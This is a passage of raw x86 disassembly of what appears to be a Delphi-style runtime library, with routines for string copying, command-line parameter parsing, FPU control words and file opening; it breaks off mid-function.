  402a8a:	e8 ed 1f 00 00       	call   0x404a7c
  402a8f:	c3                   	ret
  402a90:	53                   	push   %ebx
  402a91:	56                   	push   %esi
  402a92:	8b f2                	mov    %edx,%esi
  402a94:	8b d8                	mov    %eax,%ebx
  402a96:	80 e3 7f             	and    $0x7f,%bl
  402a99:	83 3d 08 d0 41 00 00 	cmpl   $0x0,0x41d008
  402aa0:	74 0a                	je     0x402aac
  402aa2:	8b d6                	mov    %esi,%edx
  402aa4:	8b c3                	mov    %ebx,%eax
  402aa6:	ff 15 08 d0 41 00    	call   *0x41d008
  402aac:	84 db                	test   %bl,%bl
  402aae:	75 0d                	jne    0x402abd
  402ab0:	e8 af 3d 00 00       	call   0x406864
  402ab5:	8b 98 04 00 00 00    	mov    0x4(%eax),%ebx
  402abb:	eb 0f                	jmp    0x402acc
  402abd:	80 fb 18             	cmp    $0x18,%bl
  402ac0:	77 0a                	ja     0x402acc
  402ac2:	33 c0                	xor    %eax,%eax
  402ac4:	8a c3                	mov    %bl,%al
  402ac6:	8a 98 48 c0 41 00    	mov    0x41c048(%eax),%bl
  402acc:	33 c0                	xor    %eax,%eax
  402ace:	8a c3                	mov    %bl,%al
  402ad0:	8b d6                	mov    %esi,%edx
  402ad2:	e8 ad ff ff ff       	call   0x402a84
  402ad7:	5e                   	pop    %esi
  402ad8:	5b                   	pop    %ebx
  402ad9:	c3                   	ret
  402ada:	8b c0                	mov    %eax,%eax
  402adc:	83 e0 7f             	and    $0x7f,%eax
  402adf:	8b 14 24             	mov    (%esp),%edx
  402ae2:	e9 a9 ff ff ff       	jmp    0x402a90
  402ae7:	c3                   	ret
  402ae8:	50                   	push   %eax
  402ae9:	52                   	push   %edx
  402aea:	51                   	push   %ecx
  402aeb:	e8 74 3d 00 00       	call   0x406864
  402af0:	83 b8 04 00 00 00 00 	cmpl   $0x0,0x4(%eax)
  402af7:	59                   	pop    %ecx
  402af8:	5a                   	pop    %edx
  402af9:	58                   	pop    %eax
  402afa:	75 01                	jne    0x402afd
  402afc:	c3                   	ret
  402afd:	31 c0                	xor    %eax,%eax
  402aff:	e9 d8 ff ff ff       	jmp    0x402adc
  402b04:	c3                   	ret
  402b05:	8d 40 00             	lea    0x0(%eax),%eax
  402b08:	53                   	push   %ebx
  402b09:	8b d8                	mov    %eax,%ebx
  402b0b:	e8 54 3d 00 00       	call   0x406864
  402b10:	89 98 04 00 00 00    	mov    %ebx,0x4(%eax)
  402b16:	5b                   	pop    %ebx
  402b17:	c3                   	ret
  402b18:	e8 e3 e6 ff ff       	call   0x401200
  402b1d:	e8 e6 ff ff ff       	call   0x402b08
  402b22:	c3                   	ret
  402b23:	90                   	nop
  402b24:	56                   	push   %esi
  402b25:	57                   	push   %edi
  402b26:	89 c6                	mov    %eax,%esi
  402b28:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  402b2c:	31 c0                	xor    %eax,%eax
  402b2e:	0a 06                	or     (%esi),%al
  402b30:	74 2b                	je     0x402b5d
  402b32:	85 d2                	test   %edx,%edx
  402b34:	7e 18                	jle    0x402b4e
  402b36:	39 c2                	cmp    %eax,%edx
  402b38:	7f 1b                	jg     0x402b55
  402b3a:	29 d0                	sub    %edx,%eax
  402b3c:	40                   	inc    %eax
  402b3d:	85 c9                	test   %ecx,%ecx
  402b3f:	7c 14                	jl     0x402b55
  402b41:	39 c1                	cmp    %eax,%ecx
  402b43:	7f 14                	jg     0x402b59
  402b45:	01 d6                	add    %edx,%esi
  402b47:	88 0f                	mov    %cl,(%edi)
  402b49:	47                   	inc    %edi
  402b4a:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402b4c:	eb 11                	jmp    0x402b5f
  402b4e:	ba 01 00 00 00       	mov    $0x1,%edx
  402b53:	eb e5                	jmp    0x402b3a
  402b55:	31 c9                	xor    %ecx,%ecx
  402b57:	eb ec                	jmp    0x402b45
  402b59:	89 c1                	mov    %eax,%ecx
  402b5b:	eb e8                	jmp    0x402b45
  402b5d:	88 07                	mov    %al,(%edi)
  402b5f:	5f                   	pop    %edi
  402b60:	5e                   	pop    %esi
  402b61:	c2 04 00             	ret    $0x4
  402b64:	c3                   	ret
  402b65:	8d 40 00             	lea    0x0(%eax),%eax
  402b68:	53                   	push   %ebx
  402b69:	56                   	push   %esi
  402b6a:	81 c4 f0 fd ff ff    	add    $0xfffffdf0,%esp
  402b70:	8b f2                	mov    %edx,%esi
  402b72:	8b d8                	mov    %eax,%ebx
  402b74:	84 db                	test   %bl,%bl
  402b76:	74 2d                	je     0x402ba5
  402b78:	33 c0                	xor    %eax,%eax
  402b7a:	8a c3                	mov    %bl,%al
  402b7c:	83 c0 41             	add    $0x41,%eax
  402b7f:	48                   	dec    %eax
  402b80:	88 04 24             	mov    %al,(%esp)
  402b83:	c6 44 24 01 3a       	movb   $0x3a,0x1(%esp)
  402b88:	c6 44 24 02 00       	movb   $0x0,0x2(%esp)
  402b8d:	8d 84 24 09 01 00 00 	lea    0x109(%esp),%eax
  402b94:	50                   	push   %eax
  402b95:	68 05 01 00 00       	push   $0x105
  402b9a:	e8 59 e6 ff ff       	call   0x4011f8
  402b9f:	54                   	push   %esp
  402ba0:	e8 d3 e6 ff ff       	call   0x401278
  402ba5:	8d 44 24 04          	lea    0x4(%esp),%eax
  402ba9:	50                   	push   %eax
  402baa:	68 05 01 00 00       	push   $0x105
  402baf:	e8 44 e6 ff ff       	call   0x4011f8
  402bb4:	84 db                	test   %bl,%bl
  402bb6:	74 0d                	je     0x402bc5
  402bb8:	8d 84 24 09 01 00 00 	lea    0x109(%esp),%eax
  402bbf:	50                   	push   %eax
  402bc0:	e8 b3 e6 ff ff       	call   0x401278
  402bc5:	8b c6                	mov    %esi,%eax
  402bc7:	8d 54 24 04          	lea    0x4(%esp),%edx
  402bcb:	b9 05 01 00 00       	mov    $0x105,%ecx
  402bd0:	e8 2f 21 00 00       	call   0x404d04
  402bd5:	81 c4 10 02 00 00    	add    $0x210,%esp
  402bdb:	5e                   	pop    %esi
  402bdc:	5b                   	pop    %ebx
  402bdd:	c3                   	ret
  402bde:	8b c0                	mov    %eax,%eax
  402be0:	53                   	push   %ebx
  402be1:	56                   	push   %esi
  402be2:	57                   	push   %edi
  402be3:	51                   	push   %ecx
  402be4:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402be8:	81 ec 00 02 00 00    	sub    $0x200,%esp
  402bee:	89 d3                	mov    %edx,%ebx
  402bf0:	89 d6                	mov    %edx,%esi
  402bf2:	31 d2                	xor    %edx,%edx
  402bf4:	8a 16                	mov    (%esi),%dl
  402bf6:	46                   	inc    %esi
  402bf7:	42                   	inc    %edx
  402bf8:	85 c9                	test   %ecx,%ecx
  402bfa:	7e 32                	jle    0x402c2e
  402bfc:	39 d1                	cmp    %edx,%ecx
  402bfe:	7f 35                	jg     0x402c35
  402c00:	4a                   	dec    %edx
  402c01:	89 e7                	mov    %esp,%edi
  402c03:	49                   	dec    %ecx
  402c04:	29 ca                	sub    %ecx,%edx
  402c06:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402c08:	96                   	xchg   %eax,%esi
  402c09:	8a 0e                	mov    (%esi),%cl
  402c0b:	46                   	inc    %esi
  402c0c:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402c0e:	89 c6                	mov    %eax,%esi
  402c10:	89 d1                	mov    %edx,%ecx
  402c12:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402c14:	29 e7                	sub    %esp,%edi
  402c16:	8b 8c 24 00 02 00 00 	mov    0x200(%esp),%ecx
  402c1d:	39 f9                	cmp    %edi,%ecx
  402c1f:	72 02                	jb     0x402c23
  402c21:	89 f9                	mov    %edi,%ecx
  402c23:	89 df                	mov    %ebx,%edi
  402c25:	89 e6                	mov    %esp,%esi
  402c27:	88 0f                	mov    %cl,(%edi)
  402c29:	47                   	inc    %edi
  402c2a:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402c2c:	eb 0b                	jmp    0x402c39
  402c2e:	b9 01 00 00 00       	mov    $0x1,%ecx
  402c33:	eb cb                	jmp    0x402c00
  402c35:	89 d1                	mov    %edx,%ecx
  402c37:	eb c7                	jmp    0x402c00
  402c39:	81 c4 04 02 00 00    	add    $0x204,%esp
  402c3f:	5f                   	pop    %edi
  402c40:	5e                   	pop    %esi
  402c41:	5b                   	pop    %ebx
  402c42:	c2 04 00             	ret    $0x4
  402c45:	c3                   	ret
  402c46:	8b c0                	mov    %eax,%eax
  402c48:	53                   	push   %ebx
  402c49:	e8 16 3c 00 00       	call   0x406864
  402c4e:	8b 98 04 00 00 00    	mov    0x4(%eax),%ebx
  402c54:	e8 0b 3c 00 00       	call   0x406864
  402c59:	33 d2                	xor    %edx,%edx
  402c5b:	89 90 04 00 00 00    	mov    %edx,0x4(%eax)
  402c61:	8b c3                	mov    %ebx,%eax
  402c63:	5b                   	pop    %ebx
  402c64:	c3                   	ret
  402c65:	8d 40 00             	lea    0x0(%eax),%eax
  402c68:	56                   	push   %esi
  402c69:	57                   	push   %edi
  402c6a:	89 c6                	mov    %eax,%esi
  402c6c:	89 d7                	mov    %edx,%edi
  402c6e:	89 c8                	mov    %ecx,%eax
  402c70:	39 f7                	cmp    %esi,%edi
  402c72:	77 13                	ja     0x402c87
  402c74:	74 2f                	je     0x402ca5
  402c76:	c1 f9 02             	sar    $0x2,%ecx
  402c79:	78 2a                	js     0x402ca5
  402c7b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402c7d:	89 c1                	mov    %eax,%ecx
  402c7f:	83 e1 03             	and    $0x3,%ecx
  402c82:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402c84:	5f                   	pop    %edi
  402c85:	5e                   	pop    %esi
  402c86:	c3                   	ret
  402c87:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  402c8b:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  402c8f:	c1 f9 02             	sar    $0x2,%ecx
  402c92:	78 11                	js     0x402ca5
  402c94:	fd                   	std
  402c95:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402c97:	89 c1                	mov    %eax,%ecx
  402c99:	83 e1 03             	and    $0x3,%ecx
  402c9c:	83 c6 03             	add    $0x3,%esi
  402c9f:	83 c7 03             	add    $0x3,%edi
  402ca2:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402ca4:	fc                   	cld
  402ca5:	5f                   	pop    %edi
  402ca6:	5e                   	pop    %esi
  402ca7:	c3                   	ret
  402ca8:	53                   	push   %ebx
  402ca9:	56                   	push   %esi
  402caa:	57                   	push   %edi
  402cab:	55                   	push   %ebp
  402cac:	83 c4 e8             	add    $0xffffffe8,%esp
  402caf:	89 54 24 04          	mov    %edx,0x4(%esp)
  402cb3:	89 04 24             	mov    %eax,(%esp)
  402cb6:	8b f4                	mov    %esp,%esi
  402cb8:	8d 7c 24 14          	lea    0x14(%esp),%edi
  402cbc:	eb 0a                	jmp    0x402cc8
  402cbe:	8b 06                	mov    (%esi),%eax
  402cc0:	50                   	push   %eax
  402cc1:	e8 fa e4 ff ff       	call   0x4011c0
  402cc6:	89 06                	mov    %eax,(%esi)
  402cc8:	8b 06                	mov    (%esi),%eax
  402cca:	8a 18                	mov    (%eax),%bl
  402ccc:	84 db                	test   %bl,%bl
  402cce:	74 05                	je     0x402cd5
  402cd0:	80 fb 20             	cmp    $0x20,%bl
  402cd3:	76 e9                	jbe    0x402cbe
  402cd5:	8b 06                	mov    (%esi),%eax
  402cd7:	80 38 22             	cmpb   $0x22,(%eax)
  402cda:	75 0d                	jne    0x402ce9
  402cdc:	8b 06                	mov    (%esi),%eax
  402cde:	80 78 01 22          	cmpb   $0x22,0x1(%eax)
  402ce2:	75 05                	jne    0x402ce9
  402ce4:	83 06 02             	addl   $0x2,(%esi)
  402ce7:	eb df                	jmp    0x402cc8
  402ce9:	33 ed                	xor    %ebp,%ebp
  402ceb:	8b 06                	mov    (%esi),%eax
  402ced:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402cf1:	eb 5b                	jmp    0x402d4e
  402cf3:	8b 06                	mov    (%esi),%eax
  402cf5:	80 38 22             	cmpb   $0x22,(%eax)
  402cf8:	75 40                	jne    0x402d3a
  402cfa:	8b 06                	mov    (%esi),%eax
  402cfc:	50                   	push   %eax
  402cfd:	e8 be e4 ff ff       	call   0x4011c0
  402d02:	89 06                	mov    %eax,(%esi)
  402d04:	eb 14                	jmp    0x402d1a
  402d06:	8b 06                	mov    (%esi),%eax
  402d08:	50                   	push   %eax
  402d09:	e8 b2 e4 ff ff       	call   0x4011c0
  402d0e:	89 07                	mov    %eax,(%edi)
  402d10:	8b 07                	mov    (%edi),%eax
  402d12:	2b 06                	sub    (%esi),%eax
  402d14:	03 e8                	add    %eax,%ebp
  402d16:	8b 07                	mov    (%edi),%eax
  402d18:	89 06                	mov    %eax,(%esi)
  402d1a:	8b 06                	mov    (%esi),%eax
  402d1c:	8a 18                	mov    (%eax),%bl
  402d1e:	84 db                	test   %bl,%bl
  402d20:	74 05                	je     0x402d27
  402d22:	80 fb 22             	cmp    $0x22,%bl
  402d25:	75 df                	jne    0x402d06
  402d27:	8b 06                	mov    (%esi),%eax
  402d29:	80 38 00             	cmpb   $0x0,(%eax)
  402d2c:	74 20                	je     0x402d4e
  402d2e:	8b 06                	mov    (%esi),%eax
  402d30:	50                   	push   %eax
  402d31:	e8 8a e4 ff ff       	call   0x4011c0
  402d36:	89 06                	mov    %eax,(%esi)
  402d38:	eb 14                	jmp    0x402d4e
  402d3a:	8b 06                	mov    (%esi),%eax
  402d3c:	50                   	push   %eax
  402d3d:	e8 7e e4 ff ff       	call   0x4011c0
  402d42:	89 07                	mov    %eax,(%edi)
  402d44:	8b 07                	mov    (%edi),%eax
  402d46:	2b 06                	sub    (%esi),%eax
  402d48:	03 e8                	add    %eax,%ebp
  402d4a:	8b 07                	mov    (%edi),%eax
  402d4c:	89 06                	mov    %eax,(%esi)
  402d4e:	8b 06                	mov    (%esi),%eax
  402d50:	80 38 20             	cmpb   $0x20,(%eax)
  402d53:	77 9e                	ja     0x402cf3
  402d55:	8b 44 24 04          	mov    0x4(%esp),%eax
  402d59:	8b d5                	mov    %ebp,%edx
  402d5b:	e8 5c 23 00 00       	call   0x4050bc
  402d60:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402d64:	89 06                	mov    %eax,(%esi)
  402d66:	8b 44 24 04          	mov    0x4(%esp),%eax
  402d6a:	8b 00                	mov    (%eax),%eax
  402d6c:	89 44 24 10          	mov    %eax,0x10(%esp)
  402d70:	33 ed                	xor    %ebp,%ebp
  402d72:	eb 7b                	jmp    0x402def
  402d74:	8b 06                	mov    (%esi),%eax
  402d76:	80 38 22             	cmpb   $0x22,(%eax)
  402d79:	75 50                	jne    0x402dcb
  402d7b:	8b 06                	mov    (%esi),%eax
  402d7d:	50                   	push   %eax
  402d7e:	e8 3d e4 ff ff       	call   0x4011c0
  402d83:	89 06                	mov    %eax,(%esi)
  402d85:	eb 24                	jmp    0x402dab
  402d87:	8b 06                	mov    (%esi),%eax
  402d89:	50                   	push   %eax
  402d8a:	e8 31 e4 ff ff       	call   0x4011c0
  402d8f:	89 07                	mov    %eax,(%edi)
  402d91:	8b 06                	mov    (%esi),%eax
  402d93:	3b 07                	cmp    (%edi),%eax
  402d95:	73 14                	jae    0x402dab
  402d97:	8b 06                	mov    (%esi),%eax
  402d99:	8a 00                	mov    (%eax),%al
  402d9b:	8b 54 24 10          	mov    0x10(%esp),%edx
  402d9f:	88 04 2a             	mov    %al,(%edx,%ebp,1)
  402da2:	ff 06                	incl   (%esi)
  402da4:	45                   	inc    %ebp
  402da5:	8b 06                	mov    (%esi),%eax
  402da7:	3b 07                	cmp    (%edi),%eax
  402da9:	72 ec                	jb     0x402d97
  402dab:	8b 06                	mov    (%esi),%eax
  402dad:	8a 18                	mov    (%eax),%bl
  402daf:	84 db                	test   %bl,%bl
  402db1:	74 05                	je     0x402db8
  402db3:	80 fb 22             	cmp    $0x22,%bl
  402db6:	75 cf                	jne    0x402d87
  402db8:	8b 06                	mov    (%esi),%eax
  402dba:	80 38 00             	cmpb   $0x0,(%eax)
  402dbd:	74 30                	je     0x402def
  402dbf:	8b 06                	mov    (%esi),%eax
  402dc1:	50                   	push   %eax
  402dc2:	e8 f9 e3 ff ff       	call   0x4011c0
  402dc7:	89 06                	mov    %eax,(%esi)
  402dc9:	eb 24                	jmp    0x402def
  402dcb:	8b 06                	mov    (%esi),%eax
  402dcd:	50                   	push   %eax
  402dce:	e8 ed e3 ff ff       	call   0x4011c0
  402dd3:	89 07                	mov    %eax,(%edi)
  402dd5:	8b 06                	mov    (%esi),%eax
  402dd7:	3b 07                	cmp    (%edi),%eax
  402dd9:	73 14                	jae    0x402def
  402ddb:	8b 06                	mov    (%esi),%eax
  402ddd:	8a 00                	mov    (%eax),%al
  402ddf:	8b 54 24 10          	mov    0x10(%esp),%edx
  402de3:	88 04 2a             	mov    %al,(%edx,%ebp,1)
  402de6:	ff 06                	incl   (%esi)
  402de8:	45                   	inc    %ebp
  402de9:	8b 06                	mov    (%esi),%eax
  402deb:	3b 07                	cmp    (%edi),%eax
  402ded:	72 ec                	jb     0x402ddb
  402def:	8b 06                	mov    (%esi),%eax
  402df1:	80 38 20             	cmpb   $0x20,(%eax)
  402df4:	0f 87 7a ff ff ff    	ja     0x402d74
  402dfa:	8b 06                	mov    (%esi),%eax
  402dfc:	89 44 24 08          	mov    %eax,0x8(%esp)
  402e00:	8b 44 24 08          	mov    0x8(%esp),%eax
  402e04:	83 c4 18             	add    $0x18,%esp
  402e07:	5d                   	pop    %ebp
  402e08:	5f                   	pop    %edi
  402e09:	5e                   	pop    %esi
  402e0a:	5b                   	pop    %ebx
  402e0b:	c3                   	ret
  402e0c:	55                   	push   %ebp
  402e0d:	8b ec                	mov    %esp,%ebp
  402e0f:	83 c4 f8             	add    $0xfffffff8,%esp
  402e12:	53                   	push   %ebx
  402e13:	33 c0                	xor    %eax,%eax
  402e15:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402e18:	33 c0                	xor    %eax,%eax
  402e1a:	55                   	push   %ebp
  402e1b:	68 65 2e 40 00       	push   $0x402e65
  402e20:	64 ff 30             	push   %fs:(%eax)
  402e23:	64 89 20             	mov    %esp,%fs:(%eax)
  402e26:	33 db                	xor    %ebx,%ebx
  402e28:	e8 c3 e3 ff ff       	call   0x4011f0
  402e2d:	8d 55 f8             	lea    -0x8(%ebp),%edx
  402e30:	e8 73 fe ff ff       	call   0x402ca8
  402e35:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402e38:	8d 55 f8             	lea    -0x8(%ebp),%edx
  402e3b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402e3e:	e8 65 fe ff ff       	call   0x402ca8
  402e43:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402e46:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  402e4a:	74 03                	je     0x402e4f
  402e4c:	43                   	inc    %ebx
  402e4d:	eb e9                	jmp    0x402e38
  402e4f:	33 c0                	xor    %eax,%eax
  402e51:	5a                   	pop    %edx
  402e52:	59                   	pop    %ecx
  402e53:	59                   	pop    %ecx
  402e54:	64 89 10             	mov    %edx,%fs:(%eax)
  402e57:	68 6c 2e 40 00       	push   $0x402e6c
  402e5c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402e5f:	e8 30 1c 00 00       	call   0x404a94
  402e64:	c3                   	ret
  402e65:	e9 2a 16 00 00       	jmp    0x404494
  402e6a:	eb f0                	jmp    0x402e5c
  402e6c:	8b c3                	mov    %ebx,%eax
  402e6e:	5b                   	pop    %ebx
  402e6f:	59                   	pop    %ecx
  402e70:	59                   	pop    %ecx
  402e71:	5d                   	pop    %ebp
  402e72:	c3                   	ret
  402e73:	90                   	nop
  402e74:	53                   	push   %ebx
  402e75:	56                   	push   %esi
  402e76:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  402e7c:	8b da                	mov    %edx,%ebx
  402e7e:	8b f0                	mov    %eax,%esi
  402e80:	8b c3                	mov    %ebx,%eax
  402e82:	e8 0d 1c 00 00       	call   0x404a94
  402e87:	85 f6                	test   %esi,%esi
  402e89:	75 20                	jne    0x402eab
  402e8b:	68 05 01 00 00       	push   $0x105
  402e90:	8d 44 24 08          	lea    0x8(%esp),%eax
  402e94:	50                   	push   %eax
  402e95:	6a 00                	push   $0x0
  402e97:	e8 74 e3 ff ff       	call   0x401210
  402e9c:	8b c8                	mov    %eax,%ecx
  402e9e:	8d 54 24 04          	lea    0x4(%esp),%edx
  402ea2:	8b c3                	mov    %ebx,%eax
  402ea4:	e8 db 1c 00 00       	call   0x404b84
  402ea9:	eb 21                	jmp    0x402ecc
  402eab:	e8 40 e3 ff ff       	call   0x4011f0
  402eb0:	89 04 24             	mov    %eax,(%esp)
  402eb3:	8b d3                	mov    %ebx,%edx
  402eb5:	8b 04 24             	mov    (%esp),%eax
  402eb8:	e8 eb fd ff ff       	call   0x402ca8
  402ebd:	89 04 24             	mov    %eax,(%esp)
  402ec0:	85 f6                	test   %esi,%esi
  402ec2:	74 08                	je     0x402ecc
  402ec4:	83 3b 00             	cmpl   $0x0,(%ebx)
  402ec7:	74 03                	je     0x402ecc
  402ec9:	4e                   	dec    %esi
  402eca:	eb e7                	jmp    0x402eb3
  402ecc:	81 c4 0c 01 00 00    	add    $0x10c,%esp
  402ed2:	5e                   	pop    %esi
  402ed3:	5b                   	pop    %ebx
  402ed4:	c3                   	ret
  402ed5:	8d 40 00             	lea    0x0(%eax),%eax
  402ed8:	3c 61                	cmp    $0x61,%al
  402eda:	72 06                	jb     0x402ee2
  402edc:	3c 7a                	cmp    $0x7a,%al
  402ede:	77 02                	ja     0x402ee2
  402ee0:	2c 20                	sub    $0x20,%al
  402ee2:	c3                   	ret
  402ee3:	90                   	nop
  402ee4:	66 a3 20 c0 41 00    	mov    %ax,0x41c020
  402eea:	db e2                	fnclex
  402eec:	d9 2d 20 c0 41 00    	fldcw  0x41c020
  402ef2:	c3                   	ret
  402ef3:	90                   	nop
  402ef4:	6a 00                	push   $0x0
  402ef6:	d9 3c 24             	fnstcw (%esp)
  402ef9:	58                   	pop    %eax
  402efa:	c3                   	ret
  402efb:	90                   	nop
  402efc:	83 ec 0c             	sub    $0xc,%esp
  402eff:	d9 3c 24             	fnstcw (%esp)
  402f02:	d9 7c 24 02          	fnstcw 0x2(%esp)
  402f06:	9b                   	fwait
  402f07:	66 81 4c 24 02 00 0f 	orw    $0xf00,0x2(%esp)
  402f0e:	d9 6c 24 02          	fldcw  0x2(%esp)
  402f12:	df 7c 24 04          	fistpll 0x4(%esp)
  402f16:	9b d9 2c 24          	fldcw  (%esp)
  402f1a:	59                   	pop    %ecx
  402f1b:	58                   	pop    %eax
  402f1c:	5a                   	pop    %edx
  402f1d:	c3                   	ret
  402f1e:	8b c0                	mov    %eax,%eax
  402f20:	83 3d 28 d0 41 00 00 	cmpl   $0x0,0x41d028
  402f27:	74 06                	je     0x402f2f
  402f29:	ff 15 28 d0 41 00    	call   *0x41d028
  402f2f:	b8 d2 00 00 00       	mov    $0xd2,%eax
  402f34:	e9 4f 1b 00 00       	jmp    0x404a88
  402f39:	c3                   	ret
  402f3a:	8b c0                	mov    %eax,%eax
  402f3c:	53                   	push   %ebx
  402f3d:	8b d8                	mov    %eax,%ebx
  402f3f:	33 c0                	xor    %eax,%eax
  402f41:	89 43 10             	mov    %eax,0x10(%ebx)
  402f44:	33 c0                	xor    %eax,%eax
  402f46:	89 43 0c             	mov    %eax,0xc(%ebx)
  402f49:	6a 00                	push   $0x0
  402f4b:	8d 43 10             	lea    0x10(%ebx),%eax
  402f4e:	50                   	push   %eax
  402f4f:	8b 43 08             	mov    0x8(%ebx),%eax
  402f52:	50                   	push   %eax
  402f53:	8b 43 14             	mov    0x14(%ebx),%eax
  402f56:	50                   	push   %eax
  402f57:	8b 03                	mov    (%ebx),%eax
  402f59:	50                   	push   %eax
  402f5a:	e8 31 e2 ff ff       	call   0x401190
  402f5f:	85 c0                	test   %eax,%eax
  402f61:	75 0e                	jne    0x402f71
  402f63:	e8 98 e2 ff ff       	call   0x401200
  402f68:	83 f8 6d             	cmp    $0x6d,%eax
  402f6b:	75 06                	jne    0x402f73
  402f6d:	33 c0                	xor    %eax,%eax
  402f6f:	5b                   	pop    %ebx
  402f70:	c3                   	ret
  402f71:	33 c0                	xor    %eax,%eax
  402f73:	5b                   	pop    %ebx
  402f74:	c3                   	ret
  402f75:	8d 40 00             	lea    0x0(%eax),%eax
  402f78:	33 c0                	xor    %eax,%eax
  402f7a:	c3                   	ret
  402f7b:	90                   	nop
  402f7c:	53                   	push   %ebx
  402f7d:	56                   	push   %esi
  402f7e:	51                   	push   %ecx
  402f7f:	8b d8                	mov    %eax,%ebx
  402f81:	8b 73 0c             	mov    0xc(%ebx),%esi
  402f84:	85 f6                	test   %esi,%esi
  402f86:	75 04                	jne    0x402f8c
  402f88:	33 c0                	xor    %eax,%eax
  402f8a:	eb 26                	jmp    0x402fb2
  402f8c:	6a 00                	push   $0x0
  402f8e:	8d 44 24 04          	lea    0x4(%esp),%eax
  402f92:	50                   	push   %eax
  402f93:	56                   	push   %esi
  402f94:	8b 43 14             	mov    0x14(%ebx),%eax
  402f97:	50                   	push   %eax
  402f98:	8b 03                	mov    (%ebx),%eax
  402f9a:	50                   	push   %eax
  402f9b:	e8 18 e2 ff ff       	call   0x4011b8
  402fa0:	85 c0                	test   %eax,%eax
  402fa2:	75 07                	jne    0x402fab
  402fa4:	e8 57 e2 ff ff       	call   0x401200
  402fa9:	eb 02                	jmp    0x402fad
  402fab:	33 c0                	xor    %eax,%eax
  402fad:	33 d2                	xor    %edx,%edx
  402faf:	89 53 0c             	mov    %edx,0xc(%ebx)
  402fb2:	5a                   	pop    %edx
  402fb3:	5e                   	pop    %esi
  402fb4:	5b                   	pop    %ebx
  402fb5:	c3                   	ret
  402fb6:	8b c0                	mov    %eax,%eax
  402fb8:	53                   	push   %ebx
  402fb9:	8b d8                	mov    %eax,%ebx
  402fbb:	53                   	push   %ebx
  402fbc:	e8 9f e1 ff ff       	call   0x401160
  402fc1:	48                   	dec    %eax
  402fc2:	0f 94 c0             	sete   %al
  402fc5:	5b                   	pop    %ebx
  402fc6:	c3                   	ret
  402fc7:	90                   	nop
  402fc8:	53                   	push   %ebx
  402fc9:	8b d8                	mov    %eax,%ebx
  402fcb:	66 c7 43 04 b0 d7    	movw   $0xd7b0,0x4(%ebx)
  402fd1:	8b 03                	mov    (%ebx),%eax
  402fd3:	e8 e0 ff ff ff       	call   0x402fb8
  402fd8:	84 c0                	test   %al,%al
  402fda:	75 07                	jne    0x402fe3
  402fdc:	e8 1f e2 ff ff       	call   0x401200
  402fe1:	5b                   	pop    %ebx
  402fe2:	c3                   	ret
  402fe3:	33 c0                	xor    %eax,%eax
  402fe5:	5b                   	pop    %ebx
  402fe6:	c3                   	ret
  402fe7:	90                   	nop
  402fe8:	56                   	push   %esi
  402fe9:	89 c6                	mov    %eax,%esi
  402feb:	31 c0                	xor    %eax,%eax
  402fed:	89 46 0c             	mov    %eax,0xc(%esi)
  402ff0:	89 46 10             	mov    %eax,0x10(%esi)
  402ff3:	66 8b 46 04          	mov    0x4(%esi),%ax
  402ff7:	2d b1 d7 00 00       	sub    $0xd7b1,%eax
  402ffc:	74 0b                	je     0x403009
  402ffe:	48                   	dec    %eax
  402fff:	74 20                	je     0x403021
  403001:	48                   	dec    %eax
  403002:	74 2e                	je     0x403032
  403004:	e9 67 01 00 00       	jmp    0x403170
  403009:	b8 00 00 00 80       	mov    $0x80000000,%eax
  40300e:	ba 01 00 00 00       	mov    $0x1,%edx
  403013:	b9 03 00 00 00       	mov    $0x3,%ecx
  403018:	c7 46 1c 3c 2f 40 00 	movl   $0x402f3c,0x1c(%esi)
  40301f:	eb 27                	jmp    0x403048
  403021:	b8 00 00 00 40       	mov    $0x40000000,%eax
  403026:	ba 01 00 00 00       	mov    $0x1,%edx
  40302b:	b9 02 00 00 00       	mov    $0x2,%ecx
  403030:	eb 0f                	jmp    0x403041
  403032:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  403037:	ba 01 00 00 00       	mov    $0x1,%edx
  40303c:	b9 03 00 00 00       	mov    $0x3,%ecx
  403041:	c7 46 1c 7c 2f 40 00 	movl   $0x402f7c,0x1c(%esi)
  403048:	c7 46 24 c8 2f 40 00 	movl   $0x402fc8,0x24(%esi)
  40304f:	c7 46 20 78 2f 40 00 	movl   $0x402f78,0x20(%esi)
  403056:	80 7e 48 00          	cmpb   $0x0,0x48(%esi)
  40305a:	0f 84 b2 00 00 00    	je     0x403112
  403060:	6a 00                	push   $0x0
  403062:	68 80 00 00 00       	push   $0x80
  403067:	51                   	push   %ecx
  403068:	6a 00                	push   $0x0
  40306a:	52                   	push   %edx
  40306b:	50                   	push   %eax
  40306c:	8d 46 48             	lea    0x48(%esi),%eax
  40306f:	50                   	push   %eax
  403070:	e8 f3 e0 ff ff       	call   0x401168
  403075:	83 f8 ff             	cmp    $0xffffffff,%eax
  403078:	0f 84 08 01 00 00    	je     0x403186
  40307e:	89 06                	mov    %eax,(%esi)
  403080:	66 81 7e 04 b3 d7    	cmpw   $0xd7b3,0x4(%esi)
  403086:	0f 85 c3 00 00 00    	jne    0x40314f
  40308c:	66 ff 4e 04          	decw   0x4(%esi)
  403090:	6a 00                	push   $0x0
  403092:	ff 36                	push   (%esi)
  403094:	e8 df e0 ff ff       	call   0x401178
  403099:	40                   	inc    %eax
  40309a:	0f 84 e6 00 00 00    	je     0x403186
